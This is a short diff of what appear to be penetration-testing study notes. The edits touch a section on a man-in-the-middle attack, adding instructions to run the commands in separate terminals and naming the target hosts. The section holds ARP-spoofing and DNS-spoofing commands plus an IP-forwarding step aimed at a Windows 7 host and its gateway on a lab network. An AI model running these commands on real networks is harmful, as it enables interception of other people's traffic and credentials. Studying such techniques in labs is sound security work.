@@ -1813,14 +1813,14 @@ dnsspoof -i eth1 -f dns
 echo 1 > /proc/sys/net/ipv4/ip_forward
 ```
 
-> This command can be used to enable ip-forwarding.
+> This command can be used to enable ip-forwarding. in seperate terminal
 
 ```Shell
 arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
 arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
 ```
-
-> The attacker positions themselves in the middle of the communication between `172.16.5.5` and `172.16.5.1`, enabling a Man-in-the-Middle (MitM) attack.
+***Windows 7 at 172.16.5.5, and the default gateway at 172.16.5.1***
+> The attacker positions themselves in the middle of the communication between `172.16.5.5` and `172.16.5.1`, enabling a Man-in-the-Middle (MitM) attack. both run in seperate terminal.
 
 ***EXPLAINATION:***
 
